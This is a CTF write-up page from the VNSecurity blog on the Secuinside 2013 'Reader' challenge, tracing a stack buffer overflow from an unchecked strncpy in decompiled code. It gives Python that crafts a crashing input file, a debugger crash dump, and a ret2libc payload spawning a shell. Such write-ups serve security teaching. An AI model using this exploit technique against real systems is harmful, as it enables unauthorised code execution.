@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>[Secuinside CTF 2013] Reader Writeup</title>
+  <meta name="description" content="Description:">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">[Secuinside CTF 2013] Reader Writeup</h4>
+    <p class="post-meta">May 29, 2013 • suto</p>
+  </header>
+
+  <article class="post-content">
+    <p><em>Description:</em></p>
+
+<blockquote>
+  <p>http://war.secuinside.com/files/reader</p>
+
+  <p>ip : 59.9.131.155<br />
+port : 8282 (SSH)<br />
+account : guest / guest</p>
+
+  <p>We have obtained a program designed for giving orders to criminals.</p>
+
+  <p>Our investigators haven’t yet analyzed the file format this program reads.</p>
+
+  <p>Please help us analyze the file format this program uses, find a vulnerability, and take a shell.</p>
+</blockquote>
+
+<p>From the description we can know this challenge requires an input file with correct format. Since it is simple to determine that format, I won’t talk deeper, you can find the details in sub_0804891A.<br />
+So I will show the vulnerability in this “Reader”.</p>
+
+<p>Below is the main routine of this challenge:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80490B8(signed int a1, int a2)
+{
+  int v2; // ecx@7
+  int result; // eax@7
+  int file; // [sp+20h] [bp-90h]@4
+  char buffer[140]; // [sp+24h] [bp-8Ch]@1
+
+  *(_DWORD *)&amp;buffer[136] = *MK_FP(__GS__, 20);
+  if ( a1 &lt;= 1 )
+  {
+    printf("Usage: %s &lt;FILENAME&gt;n", *(_DWORD *)a2);
+    exit(1);
+  }
+  sub_8048825(*(const char **)(a2 + 4));
+  file = open(*(const char **)(a2 + 4), 0);
+  if ( file &lt; 0 )
+  {
+    perror(&amp;byte_8049322);
+    exit(1);
+  }
+  pre_path(file, (_DWORD *)buffer);
+  vuln_path((_DWORD *)buffer);
+  free_path((_DWORD *)buffer);
+  close(file);
+  result = 0;
+  if ( *MK_FP(__GS__, 20) != *(_DWORD *)&amp;buffer[136] )
+    __stack_chk_fail(v2, *MK_FP(__GS__, 20) ^ *(_DWORD *)&amp;buffer[136]);
+  return result;
+}
+</pre>
+
+<p>As you can see, variable buffer is used in multiple locations. After some minutes review I saw an interesting point in sub_08048C7A:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl vuln_path_(_DWORD *BUFF)
+{
+  size_t ulen; // eax@4
+  int v2; // edx@4
+  int v3; // ecx@4
+  int result; // eax@4
+  unsigned int i; // [sp+28h] [bp-20h]@1
+  int v6; // [sp+3Ch] [bp-Ch]@1
+
+  v6 = *MK_FP(__GS__, 20);
+  for ( i = 0; BUFF[2] &gt; i; ++i )
+  {
+    putchar(*(_BYTE *)(BUFF[7] + i));
+    fflush(stdout);
+    usleep(BUFF[3]);
+  }
+  ulen = strlen((const char *)BUFF + 83);       // re-cal length (1)
+  strncpy(BUFF[6], gPTR, ulen);                 // overflow occurs
+  puts("n");
+  result = *MK_FP(__GS__, 20) ^ v6;
+  if ( *MK_FP(__GS__, 20) != v6 )
+    __stack_chk_fail(v3, v2);
+  return result;
+}
+</pre>
+
+<p>The <em>strncpy()</em> function copies <strong>ulen</strong> bytes from <strong>gPTR</strong> to <strong>BUFF[6]</strong> without any limit check. So I back to main routine to see where <strong>BUFF[6]</strong> is initialized, and it is located in sub_08048D41:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">unsigned int index; // [sp+18h] [bp-20h]@1
+  int s[7]; // [sp+1Ch] [bp-1Ch]@1
+
+  bzero(s, 0x14u);
+  putchar(10);
+  for ( index = 0; *BUFF &gt; index; ++index )
+  {
+    putchar(*(_BYTE *)(BUFF[5] + index));
+    fflush(stdout);
+    usleep(BUFF[3]);
+  }
+  printf("nn ");
+  for ( index = 0; BUFF[1] + 4 &gt; index; ++index )
+  {
+    putchar(*((_BYTE *)BUFF + 16));
+    fflush(stdout);
+    usleep(BUFF[3]);
+  }
+ .....
+ .....
+  BUFF[6] = &index;
+ .....
+ .....
+</pre>
+
+<p>So <strong>BUFF[6]</strong> is set to address of local variable of this function, we can clearly see this function is not protected by stack cookie. So it is just a simple buffer overflow issue. We can craft a valid file format and see where it gets the input to calculate <strong>ulen</strong> in (1). Back to sub_0804891A we can see:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">*BUFF = *(_DWORD *)&buf;
+  read(fd, &amp;buf, 4u);
+  BUFF[1] = *(_DWORD *)&buf;                    // read 4 bytes from file
+  read(fd, &amp;buf, 4u);
+  BUFF[2] = *(_DWORD *)&buf;
+  read(fd, &amp;buf, 4u);
+  BUFF[3] = *(_DWORD *)&buf;
+  read(fd, &amp;buf, 1u);
+  *((_BYTE *)BUFF + 16) = buf;
+  if ( *BUFF &lt;= 4u || *BUFF &gt; 0x32u || BUFF[1] &gt; 0x64u || BUFF[2] &gt; 0x320u || !*((_BYTE *)BUFF + 16) )// 0x4-0x32 0x64 0x32
+    ((void (__cdecl *)(_DWORD))ERR)("Initialization error");
+  Copy(&amp;buf, (char *)BUFF + 32);
+  BUFF[5] = malloc(*BUFF);
+  if ( !BUFF[5] )
+    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
+  BUFF[6] = malloc(BUFF[1]);                    // use 4 bytes read above to malloc -&gt; BUFF[6] will has this length
+  gPTR = (void *)BUFF[6]; -&gt; Set gPTR to BUFF[6]
+  if ( !BUFF[6] )
+    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
+  BUFF[7] = malloc(BUFF[2]);
+  if ( !BUFF[7] )
+    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
+  bzero((void *)BUFF[5], *BUFF);
+  bzero((void *)BUFF[6], BUFF[1]);
+  bzero((void *)BUFF[7], BUFF[2]);
+  read(fd, (void *)BUFF[5], *BUFF);
+  read(fd, (void *)BUFF[6], BUFF[1]);
+  read(fd, (void *)BUFF[7], BUFF[2]);
+</pre>
+
+<p>Since it checks <strong>BUFF[1]</strong> with 0×64, I blindly set it to 0×63 to maximize the len of <strong>gPTR</strong> string and got a nice crash, so no need to do further investigation. Below is python code to generate valid <em>“test.sec”</em> file and trigger the crash:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">data = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
+       + "x08x00x00x00"
+       + "x63x00x00x00" # will become BUFF[1] and length of BUFF[6]
+       + "x32x00x00x00"
+       + "x00x00x00x00"
+       + "X"*200
+file = open("test.sec","w")
+file.write(data)
+file.close()
+</pre>
+
+<p>Run reader with <em>test.sec</em> and we got a crash looks like:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">- THE END -
+document identifier code: 14821847921482184792148218479214821847921482184792
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x2
+EBX: 0xb7fcfff4 --&gt; 0x1a0d7c
+ECX: 0xffffffff
+EDX: 0xb7fd18b8 --&gt; 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0x58585858 ('XXXX')
+ESP: 0xbffff640 ("XXXXXXXXXX")
+EIP: 0x58585858 ('XXXX')
+EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x58585858
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff640 ("XXXXXXXXXX")
+0004| 0xbffff644 ("XXXXXX")
+0008| 0xbffff648 --&gt; 0x5858 ('XX')
+0012| 0xbffff64c --&gt; 0xb7fff918 --&gt; 0x0
+0016| 0xbffff650 --&gt; 0x0
+0020| 0xbffff654 --&gt; 0x0
+0024| 0xbffff658 --&gt; 0x0
+0028| 0xbffff65c --&gt; 0xbffff794 --&gt; 0xbffff8b6 ("/home/suto/reader")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x58585858 in ?? ()
+</pre>
+
+<p>As this is a local exploit, <em>“ulimit -s unlimited”</em> trick will help to de-randomize libc and a simple system(“sh”) will work. Payload:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">system = 0x4006b280
+sh = 0x8048366
+payload = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
+         + "x08x00x00x00"
+         + "x08x00x00x00"
+         + "x32x00x00x00"
+         + "x00x00x00x00"
+         + "A"*37 # padding
+         + struct.pack("&lt;L", system) + struct.pack("&lt;L", -1) + struct.pack("&lt;L", sh)
+fd = open("test.sec","w")
+fd.write(payload)
+fd.close()
+</pre>
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
